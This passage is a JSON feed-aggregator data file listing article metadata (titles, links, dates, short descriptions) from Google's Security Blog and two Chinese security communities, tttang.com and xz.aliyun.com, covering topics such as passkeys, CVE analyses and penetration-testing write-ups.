          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/05/passkeys-on-your-phone-computer-and-security-keys.html",
          "author": null,
          "description": "Sriram Karra and Christiaan Brand, Google product managers\n\n\nLast year, Google launched passkey support for Google Accounts. Passkeys are a new industry standard that give users an easy, highly secure way to sign-in to apps and websites. Today, we announced that passkeys have been used to authenticate users more than 1 billion times across over 400 million Google Accounts.\n\n\n\n\n\nAs more users encounter passkeys, we’re often asked questions about how they relate to security keys, how Google Workspace administrators can configure passkeys for the user accounts that they manage, and how they relate to the Advanced Protection Program (APP). This post will seek to clarify these topics.\n\n\n\n\n\nPasskeys and security keys\nPasskeys are an evolution of security keys, meaning users get the same security…",
          "link": "http://security.googleblog.com/2024/05/passkeys-on-your-phone-computer-and-security-keys.html",
          "publishedOn": "2024-05-02T11:59:00.001Z",
          "wordCount": 7590,
          "title": "Your Google Account allows you to create passkeys on your phone, computer and security keys",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html",
          "author": null,
          "description": "Posted by  Will Harris, Chrome Security Team\n\n\n\n\n    \n.code {\n    font-family: \"Courier New\", Courier, monospace;\n    font-size: 11.8px;\n    font-weight: bold;\n    background-color: #f4f4f4;\n    padding: 2px;\n    border: 1px solid #ccc;\n    border-radius: 2px;\n    white-space: pre-wrap;\n    display: inline-block;\n    line-height: 12px;\n}\n.highlight {\n    color: red;\n}\n    \n\n\n\n\n\n\nChromium's sandboxed process model defends well from malicious web content, but there are limits to how well the application can protect itself from malware already on the computer. Cookies and other credentials remain a high value target for attackers, and we are trying to tackle this ongoing threat in multiple ways, including working on web standards like\n  DBSC\n  that will help disrupt the cookie theft industry …",
          "link": "http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html",
          "publishedOn": "2024-04-30T16:14:00.000Z",
          "wordCount": 7482,
          "title": "Detecting browser data theft using Windows Event Logs",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/how-we-fought-bad-apps-and-bad-actors-in-2023.html",
          "author": null,
          "description": "Posted by Steve Kafka and Khawaja Shams (Android Security and Privacy Team), and Mohet Saxena (Play Trust and Safety)\n\n\nA safe and trusted Google Play experience is our top priority. We leverage our SAFE (see below) principles to provide the framework to create that experience for both users and developers. Here's what these principles mean in practice:\n(S)afeguard our Users. Help them discover quality apps that they can trust.\n\n(A)dvocate for Developer Protection. Build platform safeguards to enable developers to focus on growth.\n\n(F)oster Responsible Innovation. Thoughtfully unlock value for all without compromising on user safety.\n\n(E)volve Platform Defenses. Stay ahead of emerging threats by evolving our policies, tools and technology.\n\n\n\nWith those principles in mind, we’ve made recen…",
          "link": "http://security.googleblog.com/2024/04/how-we-fought-bad-apps-and-bad-actors-in-2023.html",
          "publishedOn": "2024-04-29T15:59:00.000Z",
          "wordCount": 5924,
          "title": "How we fought bad apps and bad actors in 2023",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/accelerating-incident-response-using.html",
          "author": null,
          "description": "Lambert Rosique and Jan Keller, Security Workflow Automation, and Diana Kramer, Alexandra Bowen and Andrew Cho, Privacy and Security Incident Response\n\n\n\n\n\n\n\n\nIntroduction\nAs security professionals, we're constantly looking for ways to reduce risk and improve our workflow's efficiency. We've made great strides in using AI to identify malicious content, block threats, and discover and fix vulnerabilities. We also published the Secure AI Framework (SAIF), a conceptual framework for secure AI systems to ensure we are deploying AI in a responsible manner. \n\n\n\n\n\nToday we are highlighting another way we use generative AI to help the defenders gain the advantage: Leveraging LLMs (Large Language Model) to speed-up our security and privacy incidents workflows.\n\n\n\n\n\nIncident management is a team spo…",
          "link": "http://security.googleblog.com/2024/04/accelerating-incident-response-using.html",
          "publishedOn": "2024-04-26T17:27:00.023Z",
          "wordCount": 14348,
          "title": "Accelerating incident response using generative AI",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html",
          "author": null,
          "description": "Posted by Yoshi Yamaguchi, Santiago Díaz, Maud Nalpas,  Eiji Kitamura, DevRel team\n\n\nThe Reporting API is an emerging web standard that provides a generic reporting mechanism for issues occurring on the browsers visiting your production website. The reports you receive detail issues such as security violations or soon-to-be-deprecated APIs, from users’ browsers from all over the world.\n\n\nCollecting reports is often as simple as specifying an endpoint URL in the HTTP header; the browser will automatically start forwarding reports covering the issues you are interested in to those endpoints. However, processing and analyzing these reports is not that simple. For example, you may receive a massive number of reports on your endpoint, and it is possible that not all of them will be helpful in i…",
          "link": "http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html",
          "publishedOn": "2024-04-23T17:15:00.000Z",
          "wordCount": 11949,
          "title": "Uncovering potential threats to your web application by leveraging security reports",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html",
          "author": null,
          "description": "Posted Kaleigh Rosenblat, Chrome Enterprise Senior Staff Software Engineer, Security Lead \n\n\nGenerative AI has emerged as a powerful and popular tool to automate content creation and simple tasks. From customized content creation to source code generation, it can increase both our productivity and creative potential.\n\n\nBusinesses want to leverage the power of LLMs, like Gemini, but many may have security concerns and want more control around how employees make sure of these new tools. For example, companies may want to ensure that various forms of sensitive data, such as Personally Identifiable Information (PII), financial records and internal intellectual property, is not to be shared publicly on Generative AI platforms. Security leaders face the challenge of finding the right balance — e…",
          "link": "http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html",
          "publishedOn": "2024-04-18T16:07:00.002Z",
          "wordCount": 4809,
          "title": "Prevent Generative AI Data Leaks with Chrome Enterprise DLP",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/04/find-my-device-network-security-privacy-protections.html",
          "author": null,
          "description": "Posted by Dave Kleidermacher, VP Engineering, Android Security and Privacy\n\n\nthe new Find My Device, which uses a crowdsourced device-locating network to help you find your lost or misplaced devices and belongings quickly – even when they’re offline. We gave careful consideration to the potential user security and privacy challenges that come with device finding services. \nDuring development, it was important for us to ensure the new Find My Device was secure by default and private by design. To build a private, crowdsourced device-locating network, we first conducted user research and gathered feedback from privacy and advocacy groups. Next, we developed multi-layered protections across three main areas: data safeguards, safety-first protections, and user controls. This approach provides …",
          "link": "http://security.googleblog.com/2024/04/find-my-device-network-security-privacy-protections.html",
          "publishedOn": "2024-04-08T16:00:00.011Z",
          "wordCount": 6443,
          "title": "How we built the new Find My Device network with user security and privacy in mind",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/03/google-public-dnss-approach-to-fight.html",
          "author": null,
          "description": "Tianhao Chi and Puneet Sood, Google Public DNS\n\n\n\n\nThe Domain Name System (DNS) is a fundamental protocol used on the Internet to translate human-readable domain names (e.g., www.example.com) into numeric IP addresses (e.g., 192.0.2.1) so that devices and servers can find and communicate with each other. When a user enters a domain name in their browser, the DNS resolver (e.g. Google Public DNS) locates the authoritative DNS nameservers for the requested name, and queries one or more of them to obtain the IP address(es) to return to the browser.\nWhen DNS was launched in the early 1980s as a trusted, content-neutral infrastructure, security was not yet a pressing concern, however, as the Internet grew DNS became vulnerable to various attacks. In this post, we will look at DNS cache poisonin…",
          "link": "http://security.googleblog.com/2024/03/google-public-dnss-approach-to-fight.html",
          "publishedOn": "2024-03-28T17:41:00.007Z",
          "wordCount": 8046,
          "title": "Google Public DNS’s approach to fight against cache poisoning attacks",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/03/address-sanitizer-for-bare-metal.html",
          "author": null,
          "description": "Posted by Eugene Rodionov and Ivan Lozano, Android Team\n\n\nWith steady improvements to Android userspace and kernel security, we have noticed an increasing interest from security researchers directed towards lower level firmware. This area has traditionally received less scrutiny, but is critical to device security. We have previously discussed how we have been prioritizing firmware security, and how to apply mitigations in a firmware environment to mitigate unknown vulnerabilities.\n\n\n \n\n\nIn this post we will show how the Kernel Address Sanitizer (KASan) can be used to proactively discover vulnerabilities earlier in the development lifecycle. Despite the narrow application implied by its name, KASan is applicable to a wide-range of firmware targets. Using KASan enabled builds during testing…",
          "link": "http://security.googleblog.com/2024/03/address-sanitizer-for-bare-metal.html",
          "publishedOn": "2024-03-26T15:59:00.004Z",
          "wordCount": 8519,
          "title": "Address Sanitizer for Bare-metal Firmware",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/03/blog-post.html",
          "author": null,
          "description": "Posted by Jasika Bawa, Xinghui Lu, Google Chrome Security & Jonathan Li, Alex Wozniak, Google Safe Browsing\n\n\nFor more than 15 years, Google Safe Browsing has been protecting users from phishing, malware, unwanted software and more, by identifying and warning users about potentially abusive sites on more than 5 billion devices around the world. As attackers grow more sophisticated, we've seen the need for protections that can adapt as quickly as the threats they defend against. That’s why we're excited to announce a new version of Safe Browsing that will provide real-time, privacy-preserving URL protection for people using the Standard protection mode of Safe Browsing in Chrome.\n\nCurrent landscape\nhash-based checks.\n\n\n\n\n\n\nHash-based check overview\n\n\nBut unsafe sites have adapted — today, t…",
          "link": "http://security.googleblog.com/2024/03/blog-post.html",
          "publishedOn": "2024-03-14T14:00:00.010Z",
          "wordCount": 7255,
          "title": "Real-time, privacy-preserving URL protection",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html",
          "author": null,
          "description": "Posted by Sarah Jacobus, Vulnerability Rewards Team\n\n\nLast year, we again witnessed the power of community-driven security efforts as researchers from around the world contributed to help us identify and address thousands of vulnerabilities in our products and services. Working with our dedicated bug hunter community, we awarded $10 million to our 600+ researchers based in 68 countries. \n\n\nNew Resources and Improvements\n\n\nJust like every year, 2023 brought a series of changes and improvements to our vulnerability reward programs:\n\n\n\nThrough our new Bonus Awards program, we now periodically offer time-limited, extra rewards for reports to specific VRP targets.\n\nWe expanded our exploit reward program to Chrome and Cloud through the launch of  v8CTF, a CTF focused on V8, the JavaScript engine…",
          "link": "http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html",
          "publishedOn": "2024-03-12T15:59:00.000Z",
          "wordCount": 6185,
          "title": "Vulnerability Reward Program: 2023 Year in Review",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html",
          "author": null,
          "description": "Alex Rebert, Software Engineer, Christoph Kern, Principal Engineer, Security Foundations\n\n\n\n\nGoogle’s Project Zero reports that memory safety vulnerabilities—security defects caused by subtle coding errors related to how a program accesses memory—have been \"the standard for attacking software for the last few decades and it’s still how attackers are having success\". Their analysis shows two thirds of 0-day exploits detected in the wild used memory corruption vulnerabilities. Despite substantial investments to improve memory-unsafe languages, those vulnerabilities continue to top the most commonly exploited vulnerability classes.\n\nIn this post, we share our perspective on memory safety in a comprehensive whitepaper. This paper delves into the data, challenges of tackling memory unsafety, an…",
          "link": "http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html",
          "publishedOn": "2024-03-04T19:00:00.022Z",
          "wordCount": 9034,
          "title": "Secure by Design: Google’s Perspective on Memory Safety",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/02/piloting-new-ways-to-protect-Android-users-from%20financial-fraud.html",
          "author": null,
          "description": "Posted by Eugene Liderman, Director of Mobile Security Strategy, Google\n\n\nFrom its founding, Android has been guided by principles of openness, transparency, safety, and choice. Android gives you the freedom to choose which device best fits your needs, while also providing the flexibility to download apps from a variety of sources, including preloaded app stores such as the Google Play Store or the Galaxy Store; third-party app stores; and direct downloads from the Internet.\nKeeping users safe in an open ecosystem takes sophisticated defenses. That’s why Android provides multiple layers of protections, powered by AI and backed by a large dedicated security & privacy team, to help to protect our users from security threats while continually making the platform more resilient. We also provid…",
          "link": "http://security.googleblog.com/2024/02/piloting-new-ways-to-protect-Android-users-from%20financial-fraud.html",
          "publishedOn": "2024-02-07T01:44:00.006Z",
          "wordCount": 6496,
          "title": "Piloting new ways of protecting Android users from financial fraud",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html",
          "author": null,
          "description": "Posted by Lars Bergstrom – Director, Android Platform Tools & Libraries and Chair of the Rust Foundation Board\n\n\nBack in 2021, we announced that Google was joining the Rust Foundation. At the time, Rust was already in wide use across Android and other Google products. Our announcement emphasized our commitment to improving the security reviews of Rust code and its interoperability with C++ code. Rust is one of the strongest tools we have to address memory safety security issues. Since that announcement, industry leaders and government agencies have echoed our sentiment. \n\n\nWe are delighted to announce that Google has provided a grant of $1 million to the Rust Foundation to support efforts that will improve the ability of Rust code to interoperate with existing legacy C++ codebases. We’re a…",
          "link": "http://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html",
          "publishedOn": "2024-02-05T16:59:00.002Z",
          "wordCount": 4957,
          "title": "Improving Interoperability Between Rust and C++",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        }
      ]
    },
    {
      "title": "跳跳糖 - 安全与分享社区",
      "feedUrl": "https://www.tttang.com/rss.xml",
      "siteUrl": "https://tttang.com",
      "articles": [
        {
          "id": "https://tttang.com/archive/1910/",
          "author": "1nhann",
          "description": "Confluence Data Center and Server 是 Atlassian 公司提供的企业级团队协作和知识管理软件，它旨在帮助团队协同工作、共享知识、记录文档和协作编辑等。经过分析，其 /json/setup-restore 接口存在未授权访问漏洞，攻击者可以通过访问该接口对站点进行恶意恢复，从而导致站点内容被完全替换，以及管理员账号密码的重置。",
          "link": "https://tttang.com/archive/1910/",
          "publishedOn": "2023-11-13T12:29:00.000Z",
          "wordCount": 1313,
          "title": "CVE-2023-22518 Confluence 未授权恢复站点漏洞",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1899/",
          "author": "有价值炮灰",
          "description": "最近一段时间都在审计 Java 代码，也算是积累了一些各式各样小技巧，但总感觉不够体系化。因此有必要先停下来，跳出业务逻辑并后退一步，更加深入地思考一下漏洞背后的成因。",
          "link": "https://tttang.com/archive/1899/",
          "publishedOn": "2023-07-30T03:11:00.000Z",
          "wordCount": 3570,
          "title": "浅谈 URL 解析与鉴权中的陷阱",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1890/",
          "author": "uf9n1x",
          "description": "这篇文章介绍内网渗透种的横向移动。",
          "link": "https://tttang.com/archive/1890/",
          "publishedOn": "2023-04-23T09:50:00.000Z",
          "wordCount": 1311,
          "title": "内网渗透之横向移动基础总结（一）",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1889/",
          "author": "巴斯.zznQ",
          "description": "回顾上上上…篇发布的文章《打造macOS下”最强”的微信取证工具》中使用 frida 工具从内存中获取到了关键数据，frida objc 的能力都来自于 frida-objc-bridge ，本着好奇探索心理想研究下原理，也没找到相关文章资料，倒是找到不少 frida-java-bridge 的文章。那么本文将从了解 Objective-C Runtime 开始，例如它的消息发送机制、Method Swizzling 等，再去探索 frida 中的 frida-objc-bridge 实现原理以及它最关键的 choose 方法的实现。",
          "link": "https://tttang.com/archive/1889/",
          "publishedOn": "2023-04-23T08:46:00.000Z",
          "wordCount": 1428,
          "title": "Break frida-objc-bridge",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1888/",
          "author": "AX",
          "description": "前段时间身边的大佬去搞攻防，近源攻击挺有成效的，拿了上千的分数，之前自己也有搞过但是一直没用到攻防上面，整理下相关的方式，后续可以参考参考，近源攻击，顾名思义😏你走近点打他，攻击队通过靠近或者位于攻击目标内部，利用各类智能设备、通信技术、物理接口等方法进行突破，也就是说，攻防期间，除了待在小黑屋里面坐牢，还可以接近目标现场，通过现场的环境进行渗透突破，达到进入内网，获取数据的目的，比起在网上打点，近源攻击能够又快又准的进入目标内网，且方法多种多样，成功率很高，但是有点随缘，运气不好的话，可能你丢的Badusb被保洁阿姨丢掉了或者被保安抓了也不一定，关键还是运气和苟住🤔",
          "link": "https://tttang.com/archive/1888/",
          "publishedOn": "2023-04-23T07:23:00.000Z",
          "wordCount": 548,
          "title": "近源攻击方式总结",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1884/",
          "author": "白帽酱",
          "description": "一天，我看完了番剧后，闲着无聊审计了一下我用来做内网共享的小工具——\"Go HTTP File Server\"。\n这是一个文件服务器,可以快速搭建http服务器共享文件.\n启动的默认路径为当前路径(./)",
          "link": "https://tttang.com/archive/1884/",
          "publishedOn": "2023-03-24T04:46:00.000Z",
          "wordCount": 1086,
          "title": "一个隐藏在Go语言标准库中的目录穿越漏洞 CVE-2022-29804",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1880/",
          "author": "无在无不在",
          "description": "跳跳糖 - 安全与分享社区",
          "link": "https://tttang.com/archive/1880/",
          "publishedOn": "2023-03-02T06:36:00.000Z",
          "wordCount": 488,
          "title": "Go语言项目容器化导致的Server-Side MIME Sniff",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1877/",
          "author": "白给",
          "description": "JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。",
          "link": "https://tttang.com/archive/1877/",
          "publishedOn": "2023-02-02T01:14:00.000Z",
          "wordCount": 5090,
          "title": "MYSQL JDBC反序列化解析",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1876/",
          "author": "Article_kelp",
          "description": "前些时间看了idekctf 2022*的task manager，出题人参考了另一位博主Python原型链污染变体的博文，于是打算写一篇文章简单学习下这种攻击方式和题目中的一些解题技巧等内容等",
          "link": "https://tttang.com/archive/1876/",
          "publishedOn": "2023-01-27T03:36:00.000Z",
          "wordCount": 1940,
          "title": "Python原型链污染变体(prototype-pollution-in-python)",
          "imageUrl": null
        },
        {
          "id": "https://tttang.com/archive/1875/",
          "author": "BOT",
          "description": "跳跳糖 - 安全与分享社区",
          "link": "https://tttang.com/archive/1875/",
          "publishedOn": "2023-01-13T02:32:00.000Z",
          "wordCount": 645,
          "title": "记一次Webshell检测引擎绕过测试",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "先知安全技术社区",
      "feedUrl": "https://xz.aliyun.com/feed",
      "siteUrl": "https://xz.aliyun.com/forum/",
      "articles": [
        {
          "id": "https://xz.aliyun.com/t/15322",
          "author": null,
          "description": "DIR-820 CVE-2022-26258漏洞复现",
          "link": "https://xz.aliyun.com/t/15322",
          "publishedOn": "2024-08-16T09:29:07.000Z",
          "wordCount": 228,
          "title": "DIR-820 CVE-2022-26258漏洞复现",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15318",
          "author": null,
          "description": "量大管饱的Fscan源码详细分析",
          "link": "https://xz.aliyun.com/t/15318",
          "publishedOn": "2024-08-16T04:54:46.000Z",
          "wordCount": 228,
          "title": "量大管饱的Fscan源码详细分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15316",
          "author": null,
          "description": "某框架路由渗透",
          "link": "https://xz.aliyun.com/t/15316",
          "publishedOn": "2024-08-15T15:43:17.000Z",
          "wordCount": 228,
          "title": "某框架路由渗透",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15315",
          "author": null,
          "description": "浅谈企业src中容易出洞的几种姿势",
          "link": "https://xz.aliyun.com/t/15315",
          "publishedOn": "2024-08-15T12:57:12.000Z",
          "wordCount": 228,
          "title": "浅谈企业src中容易出洞的几种姿势",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15194",
          "author": null,
          "description": "DLL侧加载技术分析以及如何进行武器化",
          "link": "https://xz.aliyun.com/t/15194",
          "publishedOn": "2024-08-15T10:08:24.000Z",
          "wordCount": 228,
          "title": "DLL侧加载技术分析以及如何进行武器化",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15308",
          "author": null,
          "description": "针对一个JAVA套CS马的详细分析",
          "link": "https://xz.aliyun.com/t/15308",
          "publishedOn": "2024-08-14T00:04:44.000Z",
          "wordCount": 228,
          "title": "针对一个JAVA套CS马的详细分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15305",
          "author": null,
          "description": "威胁情报作战三部曲 -- 你存在，在我们的攻击画像里",
          "link": "https://xz.aliyun.com/t/15305",
          "publishedOn": "2024-08-13T10:38:00.000Z",
          "wordCount": 228,
          "title": "威胁情报作战三部曲 -- 你存在，在我们的攻击画像里",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15304",
          "author": null,
          "description": "EDR监测遭遇滑铁卢？无驱动技术让你轻松突破EDR！",
          "link": "https://xz.aliyun.com/t/15304",
          "publishedOn": "2024-08-13T10:24:48.000Z",
          "wordCount": 228,
          "title": "EDR监测遭遇滑铁卢？无驱动技术让你轻松突破EDR！",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15303",
          "author": null,
          "description": "伪装主流会议软件 -- \"银狐”样本分析及检测规则、思路分享",
          "link": "https://xz.aliyun.com/t/15303",
          "publishedOn": "2024-08-13T10:01:06.000Z",
          "wordCount": 228,
          "title": "伪装主流会议软件 -- \"银狐”样本分析及检测规则、思路分享",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15302",
          "author": null,
          "description": "io利用之house of orange",
          "link": "https://xz.aliyun.com/t/15302",
          "publishedOn": "2024-08-13T09:19:01.000Z",
          "wordCount": 228,
          "title": "io利用之house of orange",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15300",
          "author": null,
          "description": "逆向工程中的动态调试",
          "link": "https://xz.aliyun.com/t/15300",
          "publishedOn": "2024-08-13T07:20:25.000Z",
          "wordCount": 228,
          "title": "逆向工程中的动态调试",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15299",
          "author": null,
          "description": "木马反制与隐藏技巧",
          "link": "https://xz.aliyun.com/t/15299",
          "publishedOn": "2024-08-13T05:45:00.000Z",
          "wordCount": 228,
          "title": "木马反制与隐藏技巧",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15298",
          "author": null,
          "description": "快速查找内网主机外连的工具：SharpNetCheck",
          "link": "https://xz.aliyun.com/t/15298",
          "publishedOn": "2024-08-13T04:06:26.000Z",
          "wordCount": 228,
          "title": "快速查找内网主机外连的工具：SharpNetCheck",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15297",
          "author": null,
          "description": "安卓逆向——Frida的基础用法（上）",
          "link": "https://xz.aliyun.com/t/15297",
          "publishedOn": "2024-08-13T03:03:03.000Z",
          "wordCount": 228,
          "title": "安卓逆向——Frida的基础用法（上）",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15295",
          "author": null,
          "description": "web-pwn-详细入门",
          "link": "https://xz.aliyun.com/t/15295",
          "publishedOn": "2024-08-12T14:38:50.000Z",
          "wordCount": 228,
          "title": "web-pwn-详细入门",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15293",
          "author": null,
          "description": "Windows凭证钓鱼方式面面观",
          "link": "https://xz.aliyun.com/t/15293",
          "publishedOn": "2024-08-12T05:33:39.000Z",
          "wordCount": 228,
          "title": "Windows凭证钓鱼方式面面观",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15292",
          "author": null,
          "description": "windows PPTP协议通道分析",
          "link": "https://xz.aliyun.com/t/15292",
          "publishedOn": "2024-08-12T04:26:33.000Z",
          "wordCount": 228,
          "title": "windows PPTP协议通道分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15291",
          "author": null,
          "description": "vulntarget-h靶场渗透",
          "link": "https://xz.aliyun.com/t/15291",
          "publishedOn": "2024-08-12T04:19:41.000Z",
          "wordCount": 228,
          "title": "vulntarget-h靶场渗透",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15290",
          "author": null,
          "description": "windows PPTP协议代码实现",
          "link": "https://xz.aliyun.com/t/15290",
          "publishedOn": "2024-08-12T04:17:03.000Z",
          "wordCount": 848,
          "title": "windows PPTP协议代码实现",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15289",
          "author": null,
          "description": "mqqm文件函数CQmPacket-CQmPacket分析",
          "link": "https://xz.aliyun.com/t/15289",
          "publishedOn": "2024-08-12T04:03:23.000Z",
          "wordCount": 848,
          "title": "mqqm文件函数CQmPacket-CQmPacket分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15288",
          "author": null,
          "description": "mqac文件函数ACDeviceControl漏洞分析",
          "link": "https://xz.aliyun.com/t/15288",
          "publishedOn": "2024-08-12T03:54:49.000Z",
          "wordCount": 848,
          "title": "mqac文件函数ACDeviceControl漏洞分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15287",
          "author": null,
          "description": "海康威视ISC认证绕过分析",
          "link": "https://xz.aliyun.com/t/15287",
          "publishedOn": "2024-08-12T03:46:56.000Z",
          "wordCount": 848,
          "title": "海康威视ISC认证绕过分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15286",
          "author": null,
          "description": "内网渗透之内网权限维持",
          "link": "https://xz.aliyun.com/t/15286",
          "publishedOn": "2024-08-12T02:59:32.000Z",
          "wordCount": 848,
          "title": "内网渗透之内网权限维持",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15285",
          "author": null,
          "description": "edusrc挖掘技巧汇总+信息收集各种姿势",
          "link": "https://xz.aliyun.com/t/15285",
          "publishedOn": "2024-08-12T01:46:47.000Z",
          "wordCount": 848,
          "title": "edusrc挖掘技巧汇总+信息收集各种姿势",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15281",
          "author": null,
          "description": "程序退出调用链的利用--exit_hook",
          "link": "https://xz.aliyun.com/t/15281",
          "publishedOn": "2024-08-11T01:43:43.000Z",
          "wordCount": 848,
          "title": "程序退出调用链的利用--exit_hook",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15279",
          "author": null,
          "description": "某软BI v5反序列化绕过",
          "link": "https://xz.aliyun.com/t/15279",
          "publishedOn": "2024-08-10T15:18:22.000Z",
          "wordCount": 848,
          "title": "某软BI v5反序列化绕过",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15277",
          "author": null,
          "description": "针对LOL玩家的最新钓鱼活动剖析-大量国内玩家受控",
          "link": "https://xz.aliyun.com/t/15277",
          "publishedOn": "2024-08-09T13:35:35.000Z",
          "wordCount": 848,
          "title": "针对LOL玩家的最新钓鱼活动剖析-大量国内玩家受控",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15276",
